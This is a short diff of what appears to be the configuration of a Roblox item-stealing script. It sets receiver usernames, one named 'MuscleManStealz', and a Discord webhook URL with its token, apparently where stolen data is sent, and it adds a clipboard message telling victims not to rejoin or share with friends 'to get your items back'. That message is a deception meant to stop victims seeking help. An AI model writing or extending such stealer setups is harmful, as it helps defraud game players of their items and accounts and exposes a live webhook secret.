@@ -1,3 +1,5 @@
+print("WORKING")
+setclipboard("DON'T REJOIN OR SHARE TO YOUR FRIENDS TO GET YOUR ITEMS BACK.")
 Username = "MuscleManStealz"
 Username2 = "kely5171"
 Webhook = "https://discord.com/api/webhooks/1292029911380394085/fpz6YNSZY_bqIOP6zd2S4nzLQteyva7ZfHafM5kmvkDX8cAe7UOz9FN8Behc9pqwwKoN"
